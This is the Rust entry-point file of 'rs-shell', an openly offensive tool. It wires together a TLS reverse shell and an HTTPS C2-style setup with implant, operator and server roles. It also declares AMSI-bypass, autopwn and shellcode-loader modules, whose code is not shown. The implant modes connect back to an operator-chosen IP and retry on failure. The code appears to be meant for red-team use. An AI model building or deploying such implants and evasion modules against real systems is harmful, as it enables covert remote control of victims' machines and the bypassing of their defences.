mod utils {
    pub mod structures;
    pub mod tools;
    pub mod tools_windows;
}
mod tcp {
    #[cfg_attr(target_family = "unix", path = "tcp_linux_client.rs")]
    #[cfg_attr(target_family = "windows", path = "tcp_windows_client.rs")]
    pub mod client;
    pub mod tcp_server;
}
mod https {
    #[cfg_attr(target_family = "unix", path = "https_linux_implant.rs")]
    #[cfg_attr(target_family = "windows", path = "https_windows_implant.rs")]
    pub mod https_implant;
    pub mod https_operator;
    pub mod https_server;
    pub mod routes;
}

mod amsi_bypass;
mod autopwn;
mod loader;
mod loader_syscalls;

use crate::https::https_implant::implant;
use crate::https::https_operator::operator as https_operator;
use crate::https::https_server::server as https_server;
use crate::tcp::client::client;
use crate::tcp::tcp_server::server as tcp_server;
use clap::{Arg, Command};
use log::LevelFilter;
use simple_logger::SimpleLogger;
use std::error::Error;

#[cfg(target_family = "windows")]
use syscalls::syscall;

fn main() -> Result<(), Box<dyn Error>> {
    SimpleLogger::new()
        .without_timestamps()
        .with_colors(true)
        .init()
        .unwrap();
    ::log::set_max_level(LevelFilter::Info);

    let args = Command::new("rs-shell")
        .author("BlackWasp")
        .version("0.2.1")
        .after_help("In a session, type 'help' for advanced integrated commands")
        .arg(
            Arg::new("mode")
                .short('m')
                .long("mode")
                .required(true)
                .value_parser([
                    clap::builder::PossibleValue::new("tcp"),
                    clap::builder::PossibleValue::new("https"),
                ])
                .help("communication protocol. TCP will open a simple TLS tunnel between an implant and a listener (like a classic reverse shell). HTTPS will use an HTTPS server, an HTTPS implant on the target, and a client to interact with the implant through the server (similar to a C2 infrastructure)"),
        )
        .arg(
            Arg::new("side")
                .short('s')
                .long("side")
                .required(true)
                .value_parser([
                    clap::builder::PossibleValue::new("i"),
                    clap::builder::PossibleValue::new("c"),
                    clap::builder::PossibleValue::new("l"),
                ])
                .help("launch the implant (i), the client (c) (only for HTTPS), or the listener (l)"),
        )
        .arg(
            Arg::new("ip")
                .short('i')
                .long("ip")
                .required(true)
                .help("IP address to bind to for the TCP listener or the HTTP server, or to connect to for the clients and implants"),
        )
        .arg(
            Arg::new("port")
                .short('p')
                .long("port")
                .required_if_eq("mode", "tcp")
                .help("port address to bind to for the TCP listener, or to connect to for the implant"),
        )
        .arg(
            Arg::new("cert_path")
                .long("cert-path")
                .required_if_eq("side", "l")
                .help("path of the TLS certificate for the server. In PFX or PKCS12 format for TCP, in PEM format for HTTPS"),
        )
        .arg(
            Arg::new("cert_pass")
                .long("cert-pass")
                .required_if_eq_all([
                    ("mode", "tcp"),
                    ("side", "l")
                ])
                .help("password of the TLS PKCS12 certificate for the TCP server"),
        )
        .arg(
            Arg::new("key_path")
                .long("key-path")
                .required_if_eq_all([
                    ("mode", "https"),
                    ("side", "l")
                ])
                .help("path of the TLS key for the HTTPS server"),
        )
        .get_matches();

    if args.get_one::<String>("mode").unwrap() == "tcp"
        && args.get_one::<String>("side").unwrap() == "l"
    {
        match tcp_server(
            args.get_one::<String>("ip").unwrap().as_str(),
            args.get_one::<String>("port")
                .unwrap()
                .parse::<u16>()
                .unwrap(),
            args.get_one::<String>("cert_path").unwrap().as_str(),
            args.get_one::<String>("cert_pass").unwrap().as_str(),
        ) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the server : {}", r);
                return Err(r);
            }
        }
    } else if args.get_one::<String>("mode").unwrap() == "tcp"
        && args.get_one::<String>("side").unwrap() == "i"
    {
        match client(
            args.get_one::<String>("ip").unwrap().as_str(),
            args.get_one::<String>("port").unwrap().as_str(),
        ) {
            Ok(_) => (),
            Err(r) => {
                log::debug!(
                    "Error during client execution : {}. Attempt to restart it",
                    r
                );
                match client(
                    args.get_one::<String>("ip").unwrap().as_str(),
                    args.get_one::<String>("port").unwrap().as_str(),
                ) {
                    Ok(_) => (),
                    Err(r) => {
                        log::debug!("Error still present : {}", r);
                        return Err(r);
                    }
                }
            }
        }
    } else if args.get_one::<String>("mode").unwrap() == "https"
        && args.get_one::<String>("side").unwrap() == "l"
    {
        match https_server(
            args.get_one::<String>("ip").unwrap().as_str(),
            args.get_one::<String>("cert_path").unwrap().as_str(),
            args.get_one::<String>("key_path").unwrap().as_str(),
        ) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the server : {}", r);
                return Err(Box::new(r));
            }
        }
    } else if args.get_one::<String>("mode").unwrap() == "https"
        && args.get_one::<String>("side").unwrap() == "c"
    {
        match https_operator(args.get_one::<String>("ip").unwrap().as_str()) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the client : {}", r);
                return Err(r);
            }
        }
    } else if args.get_one::<String>("mode").unwrap() == "https"
        && args.get_one::<String>("side").unwrap() == "i"
    {
        match implant(args.get_one::<String>("ip").unwrap().as_str()) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the implant : {}. Attempt to restart it", r);
                match implant(args.get_one::<String>("ip").unwrap().as_str()) {
                    Ok(_) => (),
                    Err(r) => {
                        log::debug!("Error still present : {}", r);
                        return Err(r);
                    }
                }
            }
        }
    }
    Ok(())
}
